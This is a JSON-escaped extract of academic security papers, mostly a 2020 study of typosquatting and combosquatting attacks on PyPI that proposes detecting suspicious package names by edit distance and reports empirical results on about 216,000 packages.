Ndichu, S. Ozawa, T. Misu, and K. Okada, \\u201cA machine\\nlearning approach to malicious JavaScript detection using\\n\\ufb01xed length vector representation,\\u201d inProceedings of the 2018\\nInternational Joint Conference on Neural Networks (IJCNN),\\npp. 1\\u20138, IEEE, Rio de Janeiro, Brazil, July 2018.\\n[27] H. C. Kim, Y. H. Choi and H. L. Dong, JsSandbox: a\\nframework for analyzing the behavior of malicious JavaScript\\ncode using internal function hooking,\\u201dKSII Transactions on\\nInternet & Information Systems, vol. 6, p. 2, 2012.\\n[28] K.Rieck,T.Krueger,andA.Dewald,\\u201cCujo:e\\ufb03cientdetection\\nand preventionof drive-by-download attacks,\\u201d inProceedings\\nof the 26th Annual Computer Security Applications Confer-\\nence, pp. 31\\u201339, Austin, TX, USA, December 2010.\\n[29] A. Fass, M. Backes, and B. Stock, \\u201cHidenoseek: camou\\ufb02aging\\nmaliciousjavascriptinbenignasts,\\u201din Proceedings of the 2019\\nACM SIGSAC Conference on Computer and Communications\\nSecurity, pp. 1899\\u20131913, London, UK, November 2019.\\n[30] A. Fass, R. P. Krawczyk, M. Backes, and B. Stock, \\u201cJaSt: fully\\nsyntactic detection of malicious (obfuscated) javascript,\\u201d in\\nProceedings of the International Conference on Detection of\\nIntrusions and Malware, and Vulnerability Assessment,\\npp. 303\\u2013325, Springer, Saclay, France, June 2018.\\n[31] A. Kapravelos, S. Yan, M. Cova, C. Kruegel, and G. Vigna,\\n\\u201cRevolver: an automated approach to the detection of evasive\\nweb-based malware,\\u201d in Proceedings of the 22nd USENIX\\nSecurity Symposium (USENIX Security, vol. 13, pp. 637\\u2013652,\\nWashington, DC, USA, August 2013.\\n[32] L.Yu,J.Huang,I.Ademola,M.Mitchell,J.Zhang,andR.Dai,\\n\\u201cShellbreaker: automatically detecting PHP-based malicious\\nweb shells,\\u201dComputers & Security, vol. 87, Article ID 101595,\\n2019.\\n[33] Z.Li,A.Qi,C.Xiong,Y.Chen,T.Zhu,andH.Yang,\\u201cE\\ufb00ective\\nand light-weight deobfuscation and semantic-aware attack\\ndetection for powershell scripts,\\u201d inProceedings of the 2019\\nACM SIGSAC Conference on Computer and Communications\\nSecurity, pp. 1831\\u20131847, London, UK, November 2019.\\n[34] C. E. Shannon, \\u201cA mathematical theory of communication,\\u201d\\n1e Bell System Technical Journal, vol. 27, no. 3, pp. 379\\u2013423,\\n1948.\\n[35] J. Ramos, \\u201cUsing tf-idf to determine word relevance in\\ndocument queries,\\u201d in Proceedings of the 1st Instructional\\nConference On Machine Learning, vol. 242, pp.133\\u2013142, New\\nJersey, NJ, USA, August 2003.\\n[36] J. Armand, E. Grave, P. Bojanowski, and T. Mikolov, \\u201cBag of\\ntricks for e\\ufb03cient text classi\\ufb01cation,\\u201d 2016, https://arxiv.org/\\nabs/1607.01759.\\n[37] T.K.Ho,\\u201cRandomdecisionforests,\\u201din Proceedings of the 3rd\\ninternational conference on document analysis and recogni-\\ntion, vol. 1, pp. 278\\u2013282, Montreal, Canada, August 1995.\\n[38] Y. Guo, H. Marco-Gisbert, and K. Paul, \\u201cMitigating webshell\\nattacks through machine learning techniques,\\u201d Future In-\\nternet, vol. 12, p. 1, 2020.\\nSecurity and Communication Networks 13\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n\",\n",
      "      \"Typosquatting and Combosquatting Attacks on the\\nPython Ecosystem\\nDuc-Ly Vu, Ivan Pashchenko, Fabio Massacci\\nUniversity of Trento, Italy\\n{ducly.vu, ivan.pashchenko, fabio.massacci}@unitn.it\\nHenrik Plate, Antonino Sabetta\\nSAP Security Research, France\\n{henrik.plate, antonino.sabetta}@sap.com\\nAbstract\\u2014Limited automated controls integrated into the\\nPython Package Index (PyPI) package uploading process make\\nPyPI an attractive target for attackers to trick developers into\\nusing malicious packages. Several times this goal has been\\nachieved via the combosquatting and typosquatting attacks when\\nattackers give malicious packages similar names to already exist-\\ning legitimate ones. In this paper , we study the attacks, identify\\npotential attack targets, and propose an approach to identify\\ncombosquatting and typosquatting package names automatically.\\nThe approach might serve as a basis for an automated system that\\nensures the security of the packages uploaded and distributed via\\nPyPI.\\nIndex T erms\\u2014FOSS, Malicious Software, Supply Chain At-\\ntacks, Combosquatting, Typosquatting, Python, PyPI\\nI. I NTRODUCTION\\nPython Package Index (PyPI) provides a comfortable and\\nwidely used way to distribute Python projects users. However,\\nthis ease of use comes at a cost: PyPI has been leveraged to\\nspread malware [1]. For example, the Slovak National Security\\nOf\\ufb01ce1 reported 10 cases where malicious code was embedded\\ninto the installation script to steal users\\u2019 data. Perica [2]\\nshowed that many packages in PyPI contain executables that\\nmay include malicious payload triggered by users.\\nLimited automated controls integrated into the PyPI pack-\\nage publishing system and a small number of administrators\\nprevents the security veri\\ufb01cation of every package. Hence,\\nattackers can repackage the others package code into a new\\npackage with a malicious payload, and trick users into in-\\nstalling it. Several studies demonstrated PyPI vulnerability to\\nthe squatting attacks.\\nTo demonstrate the ability to register typosquatting packages\\nTschacher [1] uploaded arti\\ufb01cial packages with the names\\nnearly identical to the legitimate packages, to the three dif-\\nferent software repositories (including PyPI), and received\\n45K downloads over several months. Stagg [3] crafted and\\nuploaded 12 packages that have names of the modules of\\nPython standard library (e.g., os, csv) and observed a\\nmassive number of downloads of these packages (>490K\\ndownloads per year). Hence, squatting package names could\\nbe an attractive way to introduce malicious packages in PyPI.\\nConsidering the ever-growing popularity of PyPI, there is\\na signi\\ufb01cant need for controls capable to automatically \\ufb01nd\\nmalicious packages hosted in PyPI and prevent attackers from\\n1https://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/\\nuploading new malicious packages. Hence, in this paper, we\\nprovide the following contributions:\\n\\u2022 a study of the common attacks to craft malicious packages\\nand trick users into downloading them,\\n\\u2022 an approach for automatic identi\\ufb01cation of packages\\nlikely used in combosquatting and typosquatting attacks.\\nFollowing the motivating study of Stagg [3], we checked\\nwhether any PyPI packages have the same name as any of\\nthe 297 module names of the Python standard library.2 We\\nidenti\\ufb01ed 62 such packages. Our manual analysis of these\\npackages suggested that they are kept in PyPI mostly for\\nbackporting reasons.3\\nTable I shows that attackers apply different modi\\ufb01cations\\nto package names, however, these names remain similar to\\nthe original packages. Therefore, we use the Levenshtein\\ndistance [4] as the simplest and widely used technique to\\ncalculate the edit distance between package name strings. Our\\nempirical results suggest that 79 933 packages are safe to use,\\nand 67 005 packages require to be further investigated.\\nII. H OW PYPI WORKS\\nPyPI is a popular repository of Python applications or\\npackages: as of February 2020, it contains more than 216K\\npackages with the total number of downloads exceeding four\\nbillion times. PyPI is maintained by a group of developers\\ncalled Python Packaging Authority (PyP A for short). Figure 1\\nprovides an overview of different roles envisioned by PyPI:\\nEnd Users, Package Owners, PyPI Moderators (PyP A), and\\nPyPI Administrators (PyP A).\\nEnd Users provide the name of a package to a package\\nmanager tool, like pip5 to install the package from PyPI.\\nAlthough pip does everything automatically for installing a\\npackage, it neither requires user authentication nor performs\\nany validation of the package. Instead,pip merely looks for\\nthe package in PyPI by its name, identi\\ufb01es and resolves its\\ndependencies, downloads all the required components, and\\ninstalls them on the End User\\u2019s computer.\\n2We checked against all modules appeared in at least one of the existing\\nPython standard libraries: Python 2.6, 2.7, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, and 3.8.\\n3The manual analysis of 62 packages available at https://github.com/\\nvuduclyunitn/wacco_2020\\n4Data collected from pypistats.com on Feb 15, 2020\\n5https://pip.pypa.io/en/stable/\\n509\\n2020 IEEE European Symposium on Security and Privacy Workshops (EuroS&PW)\\n\\u00a9 2020, Duc Ly Vu. Under license to IEEE.\\nDOI 10.1109/EuroSPW51379.2020.00074\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. Package Owners (400K)\\n End users\\nAdministrators\\nless than 10 people\\n30TB/day\\nNurse\\nModerators\\nUpload project\\nMaintain project Install project\\nBan project\\nRemove package\\nFig. 1: Roles and responsibilities in the PyPI ecosystem.4\\nPackage Owners can distribute code on PyPI using the tool\\ncalled setuptools6 that packs the original source code and\\ngenerates a local distribution that is either in a source7 or built8\\nformat. Package Owners register a package name on PyPI and\\npublish the distribution artifacts of the package. If Package\\nOwners have provided both distribution types,pip prefers to\\ninstall the built distribution \\ufb01rst. Publishing a package on PyPI\\nis restricted to Package Owers, who can later modify (e.g.,\\nupdate a new version) existing packages that they have access.\\nPyPI Administrators and Moderators have exclusive rights\\nto ban or revoke packages of Package Owners. For example, if\\na particular package is reported as malware, the Administrators\\nwill delete the package from PyPI and block the malicious de-\\nveloper. The Administrators can delete the corrupted package\\nand support the Package Owners in recovering their access if\\na package owner credentials are compromised or damaged.\\nAlthough this scheme proved to support high latency for\\nboth Package Owners and End Users, limited resources and\\nautomated controls integrated into the package uploading, and\\ndistribution process leave the room for attackers to use PyPI\\nfor spreading malicious software. PyPI especially becomes an\\nattractive target for attackers, considering the certain unbal-\\nance concerning the number of Package Owners and PyP A\\ndevelopers (40K to 1) and continuously growing popularity\\nof PyPI. In the next sections, we will give an overview of\\nthe common strategies that attackers use to craft malicious\\npackages and exploit the PyPI package distribution procedure\\nto deliver malicious packages to End Users (Section III).\\nIII. C RAFTING AND SHIPPING MALICIOUS P ACKAGES\\nIn the wild, attackers use mostly two ways to spread\\nmalicious code within the PyPI ecosystem:\\n\\u2022 steal the legitimate package owner\\u2019s credentials of an\\nexisting package, inject a malicious payload into it so\\nthat users in their normal activities can unintentionally\\ndownload it (e.g., install or update a package);\\n\\u2022 create a new package with built-in malicious payload and\\ntrick users into downloading it (e.g., by squatting the\\nname of a popular package).\\nStealing PyPI credentials. In the \\ufb01rst approach, attackers\\nexploit End Users\\u2019 trust in an already existing package. After\\n6https://github.com/pypa/setuptools\\n7https://packaging.python.org/glossary/#term-source-distribution-or-sdist\\n8https://packaging.python.org/glossary/#term-built-distribution\\nthe attacker obtained the Package Owner\\u2019s rights to perform\\nspeci\\ufb01c operations in the publishing process, they can upload\\ntheir crafted package as a new (malicious) version of a com-\\npromised package. The ssh-decoratepackage (Table I)\\nwas affected by such an attack when attackers injected a\\nmalicious functionality for sending users\\u2019 SSH credentials to a\\nremote server.9 Although this attack requires additional effort\\n(e.g., social engineering) to obtain the credentials of package\\nowners, a certain number of infections are still possible.\\nTricking users into downloading malicious packages.In\\nthe second approach, attackers create a new package that, by\\ndesign, features some malicious behavior. Attackers can craft\\nthe package from scratch or fork an existing PyPI package. In\\nthe latter case, the attackers injected a malicious dependency\\nby modifying thesetup.py installation script of the package so\\nthat the malicious dependency will be downloaded and silently\\ninstalled along with the benign package (e.g.,acqusition\\n(#11), urlib3 (#8) attacks in Table I). Then, they follow a\\nregular procedure to create an account in PyPI, register a new\\npackage name, and upload the malicious package.\\nTo increase the chance of getting more infections, attackers\\nregister package names that are similar to existing (usually\\npopular) packages by package typosquatting or package\\ncombosquatting([5],[6]) in which they split the package name\\ninto elements based on the \\\"hyphen\\\" character, and rearrange\\nthe elements, e.g., \\\"python-nmap\\\" into \\\"nmap-python\\\". Users\\nwho mistype or confuse the package name will install the\\nmalicious package instead of the legitimate one.\\nGiven a large number of package owners w.r.t. the number\\nof administrators, this likely to be (and so far has been)\\nundetected because several legitimate packages whose names\\nvery close to other legitimate packages. For example, there is a\\nPyPI package calledcpythonthat has the same name as the\\nGithub project \\u201ccpython\\u201d.10 The package, however, has a very\\nvague description and uses a different source code repository.\\nTable I shows several past combosquatting and typosquat-\\nting attacks in PyPI. Lutoma11 detected two malicious pack-\\nages; one substituted the \\u2018l\\u2019 character with the capital \\u2018I\\u2019 so\\nthat it is quite tricky to distinguish between jeIlyfish\\nand jellyfish. At the time of its detection, the package\\nhad been downloaded 119 times. Another malicious package\\nexploited the difference between the package naming practices\\nestablished in two python versions Python 2 and Python 3\\n(python3-dateutilvs. python-dateutil) to con-\\nfuse users when selecting the package of a particular Python\\nversion. These packages were used to steal users\\u2019 information\\nand send them to a remote server. Attackers prefer to delete\\ncharacters from the legitimate packages to generate squatting\\nnames. For example, the Slovak National Security identi\\ufb01ed\\nten PyPI packages12 (e.g., acqusition, urllib) that sent\\n9https://medium.com/@bertusk/cryptocurrency-clipboard-hijacker-\\ndiscovered-in-pypi-repository-b66b8a534a8\\n10\\u201ccpython\\u201d is a compiler or an interpreter, not a third-party package\\n11https://github.com/dateutil/dateutil/issues/984\\n12https://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/\\n510\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. T ABLE I: Malicious packages in our sample. Levenshtein distanced\\n# Time Appear Malicious Package Legitimate package Names change d=1 d=2\\n1 2016-03-02 virtualnv virtualenv Delete \\u2018e\\u2019 \\u2713\\n2 2016-03-03 mumpy numpy Substitute \\u2018n\\u2019 by \\u2018m\\u2019 \\u2713\\n3 2017-05-01 crypt crypto Delete \\u2018o\\u2019 \\u2713\\n4 2017-06-02 django-server django-server-guardian-api Delete \\u201c-guardian-api\\u201d\\n5 2017-06-02 pwd pwdhash.py Delete \\u201chash.py\\u201d\\n6 2017-06-02 setuptool setuptools Delete \\u2018s\\u2019 \\u2713\\n7 2017-06-02 setup-tools setuptools Insert \\u2018-\\u2019 \\u2713\\n8 2017-06-02 telnet telnetsrvlib Delete \\u201csrvlib\\u201d\\n9 2017-06-02 urlib3 urllib3 Delete \\u2018l\\u2019 \\u2713\\n10 2017-06-02 urllib urllib3 Delete \\u20183\\u2019 \\u2713\\n11 2017-06-03 acqusition acquisition Delete \\u2018i\\u2019 \\u2713\\n12 2017-06-03 apidev-coop apidev-coop_cms Delete \\u201c_cms\\u201d\\n13 2017-06-04 bzip bz2\\ufb01le Substitute \\u201c2\\ufb01le\\u201d by \\u201cip\\u201d\\n14 2017-11-23 djanga django Substitute \\u2018a\\u2019 by \\u2018o\\u2019 \\u2713\\n15 2017-11-24 easyinstall easy_install Delete \\u2018_\\u2019 \\u2713\\n16 2017-12-05 colourama colorama Delete \\u2018u\\u2019 \\u2713\\n17 2018-04-25 openvc opencv-python Swap \\u2018c\\u2019 and \\u2018v\\u2019 & Delete \\u201c-python\\u201d\\n18 2018-05-02 mateplotlib matplotlib Insert \\u2018e\\u2019 \\u2713\\n19 2018-05-02 numipy numpy Insert \\u2018i\\u2019 \\u2713\\n20 2018-05-02 python-mysql MySQL-python Swap \\u201cpython\\u201d and \\u201cmysql\\u201d \\u2713\\n21 2018-05-03 libcurl pycurl Substitute \\u201cpy\\u201d by \\u201clib\\u201d\\n22 2018-05-03 libhtml5 html5lib Swap \\u201chtml5\\u201d and \\u201clib\\u201d\\n23 2018-05-03 pysprak pyspark Swap \\u2018a\\u2019 and \\u2018r\\u2019 \\u2713\\n24 2018-05-03 PyYMAL pyyaml Swap \\u2018a\\u2019 and \\u2018m\\u2019 \\u2713\\n25 2018-05-10 nmap-python python-nmap Swap \\u201cnmap\\u201d and \\u201cpython\\u201d \\u2713\\n26 2018-05-10 python-mongo pymongodb Delete \\u201cdb\\u201d & Substitute \\u201cpy\\u201d by \\u201cpython-\\u201d\\n27 2018-05-10 python-openssl openssl-python Swap \\u201copenssl\\u201d and \\u201cpython\\u201d \\u2713\\n28 2018-09-17 pytz3-dev pytz Insert \\u201c3-dev\\u201d\\n29 2018-10-29 python-sqlite pysqlite Substitute \\u201cpy\\u201d by \\u201cpython-\\u201d\\n30 2018-10-30 python-ftp pyftpdlib Delete \\u201cdlib\\u201d & Substitute \\u201cpy\\u201d by \\u201cpython-\\u201d\\n31 2018-10-30 python-mysqldb MySQL-python Swap \\u201cpython\\u201d and \\u201cmysql\\u201d & Insert \\u201cdb\\u201d\\n32 2018-10-30 smb pysmb Delete \\u201cpy\\u201d \\u2713\\n33 2018-10-31 pythonkafka kafka-python Swap \\u201ckafka\\u201d and \\u201cpython\\u201d & Delete \\u2018-\\u2019\\n34 2019-12-01 jeIly\\ufb01sh jelly\\ufb01sh Substitute \\u2018l\\u2019 by \\u2018I\\u2019 \\u2713\\n35 2019-12-01 python3-dateutil python-dateutil Insert \\u20183\\u2019 \\u2713\\n36 2018-04-25 ssh-decorate ssh-decorate Hijacked Package\\nsensitive information to a remote server, nine of the packages\\nwere created by deleting characters from original packages.\\nSeveral combosquatting packages were distributed by ex-\\nploiting the usage of common pre\\ufb01xes or suf\\ufb01xes within\\nPyPI packages (see the analysis in Section V), e.g., pytz\\ninto pytz3-dev making the malicious package look like\\nthe distribution of a Python 3 development version of the\\noriginal package. Similarly, attackers used a singular form\\nof a package name instead of a plural one ( setuptool\\ninstead of setuptools), add special characters (e.g.,\\nhyphens or underscores), somewhere in a package name\\n(setup-toolsinstead ofsetuptools, easy_install\\ninstead ofeasyinstall), or create a similar package name\\na commonly known tool or a module of the standard library\\n(e.g., pwd13). Attackers leveraged the difference in spellings\\nof UK and US languages: malicious packagecolourama, re-\\nsembling the benign packagecolorama, download a crypto\\nminer upon installation by victims.14\\nIV . TELLING MALICIOUS PACKAGES APA RT\\nWe start by describing our collection of the ground-truth\\npackages. They are the ones whose characteristics of a le-\\ngitimate package. Then we proceed to identify suspicious\\n13There exist similar Linux commands.\\n14https://medium.com/@bertusk/cryptocurrency-clipboard-hijacker-\\ndiscovered-in-pypi-repository-b66b8a534a8\\npackages whose names that are the same or similar to the\\nground-truth packages.\\nAssumptions: Our ground-truth packages consist of two\\ntrusted sources:\\n1) Modules of the Python standard library15 (e.g., os, csv,\\nre) that are bundled into Python distributions.\\n2) PyPI packages with known source code repositories.\\nSimilar to [3], we assume that a PyPI package should not\\nuse the name of a module of the Python standard library. If a\\npackage in PyPI has an exact or nearly identical name to one\\nof these modules, we mark such a package as suspicious.\\nWe assume that a PyPI package\\u2019s legitimacy could be\\nveri\\ufb01ed by checking its source code repository that provides\\nadditional metrics (e.g., number of stars, followers, and forks)\\noften used by developers to reason about the package repu-\\ntation and community support [7]. Considering the examples\\nof Table I, we observe that developers tend to use the same\\npackage name as the repository name in Github. Although\\nthere is no strict requirement on the name correspondence, we\\nbase on this observation to identify the list of packages with\\nknown code repositories as ground-truth:\\n\\u2022 PyPI packages whose names are the same as the reposi-\\ntory names in Github are not typosquatting packages,\\n15https://docs.python.org/3/library/\\n511\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. \\u2022 PyPI packages whose names are different than the repos-\\nitory names or do not have any reference to a Github\\nrepository, require additional veri\\ufb01cation (Section VI).\\nAlgorithm: To measure the similarity of package names, we\\ncalculate the Levenshtein distance [4] between each pair of\\npackages and check if the distance is less than or equal to a\\nthreshold heuristically. Based on the list of previous typosquat-\\nting package names in Table I, we de\\ufb01ne the threshold for the\\npackage name similarity to be equal to two as it allows us\\nto identify the majority of known attacks (21 out of 36) and\\nreduce the number of false positives.\\nFigure 2 summarizes the proposed idea for detection of\\nsquatting packages. Packages where source appears in a repos-\\nitory (e.g., Github) can be veri\\ufb01ed either by checking their\\nreputation (e.g., number of stars) or source code. We assume\\nthat the packages that do not have source code repositories\\nor share the same repository while having a different name\\nat the same time with another are suspicious. We note that it\\nis not required that a legitimate package name in PyPI is the\\nsame as the repository name in Github or other version control\\nsystems.\\nPyPI\\n\\u2022 urllib3\\n\\u2022 tensor\\ufb02ow\\n\\u2022 pandas\\n..\\nSelect apackage\\nDoes thepackage have\\nthe same nameas a module ofstandard libs?\\nDoes thepackage have\\nthe namesimilar to amodule ofstandard libs?\\nDoes thepackage\\nhave thesamerepository\\nname?\\nDoes thepackage\\nhave thenamesimilar to apackage\\nwith knownsource?\\nManualinspection\\nNo\\nNo Yes\\nYe s\\nYe s\\nFig. 2: Detecting Suspicious Squatting Packages.16\\nStep 1: Processing of modules of Python standard library\\nTo compose a list of module names of the Python standard\\nlibrary, we base on thestdlib-list17 package to collect\\nPython standard library module names of the Python standard\\nlibrary from nine different Python versions. Then, we scan the\\nwhole PyPI and report packages whose names are the same\\nas any module of Python standard library as suspicious.\\nStep 2: Processing of PyPI packages with known source\\ncode repositoriesFor those PyPI packages whose URLs lead\\nto Github repositories, we use the URLs to extract the source\\ncdoe repository names. After comparing the repository and\\npackage name, we classify packages that have the same name\\nas not created for a typosquatting attack and all other packages\\nas required to pass through additional veri\\ufb01cation.\\nStep 3: Identi\\ufb01cation of packages possibly created for\\nsquatting attacksWe look for packages whose names have\\n16To simplify the algorithm, unspeci\\ufb01ed paths all lead to the legitimate\\npackages which are not required inspection.\\n17https://pypi.org/project/stdlib-list/\\nT ABLE II: Descriptive statistics of package name lengths.\\ncount mean std min 25% 50% 75% max\\npackage 216 547 12.4 7.4 1 7 10 16 80\\nthe Levenshtein distance less or equal than two to the module\\nnames of Python standard library and the packages whose\\nthe same names as code repositories (Step 2). To capture\\nthe common pre\\ufb01x \\u201cpython\\u201d added during the combosquatting\\nattack, we preprocess package names by substituting \\u201cpython\\u201d\\nwith \\u2018*\\u2019. This transformation allows us to capture, e.g., attacks\\n#20, #25-27, #29-31, and #33 in Table I.\\nV. EMPIRICAL RESUL TS\\nDescriptive statistics:In total, we analyzed 216 548 pack-\\nages from PyPI as of February 20, 2020. On average, a\\npackage name has 12 characters, while lengths of names of\\n50% of packages are shorter or equal to ten characters. Table II\\nshows descriptive statistics of package name lengths in PyPI.\\nWe identi\\ufb01ed 165 878 packages have homepage URLs, and\\n197 packages provide code page URLs.18 The largest share of\\nPyPI packages use Github as a place to store their source\\ncode: 141 358 homepage URLs (85%) and 196 codepage\\nURLs (99%). Other packages host their source code on GitLab\\n(2792 homepage URLs and 10 codepage URLs), BitBucket\\n(4606 homepage URLs and three code page URLs), Google\\ncode (847 homepage URLs), and SourceForge (618 homepage\\nURLs). 3550 packages (13.3%) either do not provide codepage\\nURLs or use URLs on PyPI as their homepages.\\nWe noticed that 613 packages use https://github.com/pypa/\\nsampleproject as their homepage URLs. This case might hap-\\npen because package developers had used a template to create\\nPyPI packages, but did not update their homepage URLs to the\\ntemplate. Moreover, 12 266 other packages are sharing several\\nhomepage URLs. This might happen for both malicious and\\nbenign reasons. The typosquatting packagejeLlyfishused\\nthe homepage URL of the legitimate packagejellyfish\\nunchanged so it may look legitimate to End Users.\\nFigure 3 shows the distribution of the Levenshtein distances\\nbetween all packages names in PyPI. The distance distribution\\nhas a shape of a normal distribution with 4 225 244 (0.02%)\\npairs of packages that have distances between one and two.\\n54.8% of the pairs have a distance between 9 and 16. The\\nbiggest Levenstein distance between package names is 80.19\\nHence, the identi\\ufb01ed threshold of the Levenshtein distance\\n(d=2) could be seen as a good trade-off, since it allows us to\\nidentify the majority of known attacks and does not generate\\na signi\\ufb01cant number of alerts (d=4 increases the 51 times\\namount of alerts from 4.2 million to 215 million).\\nKnown attacks. We observe that the attacks in Table I\\ntargeted popular packages: seven Github repositories (25%)\\nof the attacked packages have more than 2356 stars, 14 repos-\\nitories (50%) have more than 972 stars, and 21 repositories\\n(75%) of the packages have more than 84 stars. Fifteen out of\\nthe 28 squatting attacks are identi\\ufb01ed by setting the distance\\n18We found seven packages whose URLs are broken and corrected them.\\n192to3 and aaaaaaaaaaaaaaaaaaa-aaaaaaaaa-aaaaaaasa-aa\\naaaaasa-aaaaasaa-aaaaaaasa-bbbbbbbbbbb\\n512\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. Fig. 3: Levenshtein distance distribution of package names.\\nFig. 4: #Packages whose name differ from standard modules.\\nthreshold of one. Increasing the threshold to two allows us to\\ncapture six additional attacks (21 out of 28).\\nLooking at other packages in PyPI.\\nModules of Python standard library: We found 62 pack-\\nages in PyPI that have the same names as modules of the\\nPython standard library. We further checked whether we found\\nthe packages published by Stagg [3]: while Stagg published\\n\\u2018empty\\u2019 packages that were removed from PyPI, we identi\\ufb01ed\\nseveral packages with non-empty sources. Particularly, 16 out\\nof 62 packages do not have any releases, and 12 packages\\nhave only one release. Hence, we con\\ufb01rm that these packages\\nare not the ones published by [3] and con\\ufb01rm our manually\\nanalysis.\\nFigure 4 shows the distance distribution between Python\\nstandard library module names and other packages\\u2019 names.\\nThere are 296 PyPI packages whose names have the distance\\nless than or equal to two from Python standard library module\\nnames, and therefore, suspicious.\\nPyPI packages with known sources:From those packages\\nthat use the Github to host their source code, 79 933 packages\\n(36.9%) have the same name for both Github repository\\nand package name in PyPI (i.e., safe packages). Names of\\n61 522 packages differ from the names of their source code\\nFig. 5: #Packages whose names differ from repository names.\\nrepositories, and therefore, these packages require additional\\nanalysis. In Figure 5, we identi\\ufb01ed approximately 65 000 PyPI\\npackages have the names similar to the packages with known\\nsources (they have a distance less than or equal two).\\nInteresting naming patterns. We noticed some patterns\\nbetween the package names and repository names:\\n\\u2022 16 070 (7.4%) package names include names of their\\ncode repositories or vice versa (e.g., the package\\n0-core-clienthas its repository name0-core),\\n\\u2022 several common pre\\ufb01xes and suf\\ufb01xes are added or re-\\nmoved from the repository names to create PyPI package\\nnames. Several common pre\\ufb01xes are \\u2018python-\\u2019 (2287),\\n\\u2018-python\\u2019 (1343), \\u2018.git\\u2019 (1324),\\nUnderstanding these naming patterns might potentially sup-\\nport predicting future combosquatting attacks of legitimate\\npackages as adding/deleting a suf\\ufb01x or pre\\ufb01x is one of the\\ncombosquatting strategies (See Section III).\\nVI. T HREA TS TOVALIDITY\\nMissing potential typosquatting packages.Our approach\\ncan be applied for detecting typosquatting candidates of pack-\\nages whose names are longer than 2 (the selected threshold).\\nHowever, as shown in Table II, 75% of packages in PyPI have\\nmore than seven characters in their names. Hence, our pro-\\nposed approach relies on the Levenshtein distance applicable\\nto most of the PyPI ecosystem packages. To capture packages\\nwith short names, we plan to use common name patterns (e.g.,\\nrepeated or swapped characters)([5],[8]).\\nFalse positivesThe proposed approach has generated false-\\npositive \\ufb01ndings. For example, a package name might differ\\nfrom its source code repository name for a good reason, e.g.,\\nthe developers could not register the repository name because\\nthe name has been reserved. We manually veri\\ufb01ed 62 packages\\n(the ones look the same to standard libraries) and identi\\ufb01ed\\nthe following reasons behind existing of these packages in\\nPyPI: backport to old Python versions (17), empty packages\\n(17), toy packages (2), legitimate deprecated packages with\\ndifferent functionality (26).\\nThe manual analysis allowed us to identify the following\\nideas to reduce the number of false positives by analyzing:\\n513\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. package info (e.g., author reputation, package popularity) and\\ncode features (e.g., suspicious API calls).\\nWe use source code repository as a trusted source.\\nThe legitimacy of a package depends on the equality of\\npackage and repository name. However, a repository name\\nis not necessarily unique across Github (e.g., stub42/pytz and\\nnewvem/pytz). An organization and a repository name identify\\na project in Github. Hence, attackers may create a repository\\nwith the same name but different organization identi\\ufb01ers as an\\nexisting repository in Github (or even a new repository) and\\npublish a corresponding package in PyPI. Our approach is not\\ncapable of identifying such an attack. However, this attack\\nrequires additional effort to trick the users into downloading\\npackages that come from an unknown source. To overcome\\nthis limitation, we plan to extend the proposed approach to\\nconsidering other reputation metrics (e.g., number of stars).\\nOn the other hand, one Github repository might be used to\\nstore code of several different PyPI packages. For example,\\na Github repository https://github.com/Azure/azure-sdk-for-\\npython organization corresponds to 140 packages in PyPI (e.g.,\\nazure, azure-ai-nspkg). In such a case, our approach\\nwould generate a false alert.\\nAlso, the referred repository does not need to contain code\\nthat bears any relation to the package. We plan to employ\\na code analysis to identify such a discrepancy (whether a\\nparticular code fragment in a package originates from its\\nsource code repository). This might be a good signal for\\ndetection of injected code added by attackers or backporting\\nchanges added by developers directly to the packages.\\nSome known attacks are not caught. Although the\\nproposed approach allows us to catch most of the known\\ntyposquatting attacks, some attacks in Table I still remained\\nunidenti\\ufb01ed. Additional ways of checking modi\\ufb01cations of\\npackage names might allow the detection of such attacks.\\nFor example, attacks #20, #22, #23, #24, #25, #27 are based\\non the permutation of the legitimate package names, while\\ntyposquatting package names in attacks #4, #5, #12, #8\\nwere created as a result of deletions of a part of legitimate\\npackage names. However, including such checks to enlarge the\\nsearch space for the possible typosquatting candidates might\\nsigni\\ufb01cantly increase the number of false positive alerts, and\\ntherefore, could not be used alone. Hence, we are planning to\\ninvestigate the common patterns of packaging names in future\\nwork and embed them into our approach.\\nVII. R ELA TED WORK\\nDuan et al. [9] extract various features of a package to\\nidentify its maliciousness. They rely on the prede\\ufb01ned list of\\npopular packages to \\ufb01nd suspicious packages. We propose a\\nmethod to automatically \\ufb01nd legitimate packages that can be\\nused for \\ufb01nding potential typosquatting attacks.\\nTschacher [1] presented a comprehensive analysis of ty-\\nposquatting attacks, including the systematic generation of\\ntyposquatting package names, the publication of forks of the\\noriginal packages in several open-source ecosystems. By doing\\nthis, they can measure the severity of such an attack by\\ncounting the number of successful installations. Our study\\ncomplements this work by providing an approach for obtaining\\na list of legitimate package names that can be used for\\nautomatic identi\\ufb01cation of typosquatting packages in PyPI.\\nTaylor et al. [8] proposed an approach to identify typosquat-\\nting candidates based on package name patterns, like repeated,\\nomitted, or swapped characters, common typos, swapped\\nwords, and Python version numbers. While the authors con-\\nsidered the most downloaded packages, we have analyzed all\\nthe packages with source code repository links.\\nVIII. C ONCLUSION AND FUTURE WORK\\nIn this paper, we have studied attackers strategies in crafting\\nmalicious packages and trick Python developers into down-\\nloading malicious packages whose names are similar to the\\nlegitimate packages, i.e., the combosquatting and typosquat-\\nting attacks in the Python Package Index ecosystem. We have\\nalso proposed an automatic approach for detecting packages\\naffected by the typosquatting attack. The empirical evaluation\\nof the proposed approach on the list of known squatting attacks\\nsuggests that the approach is 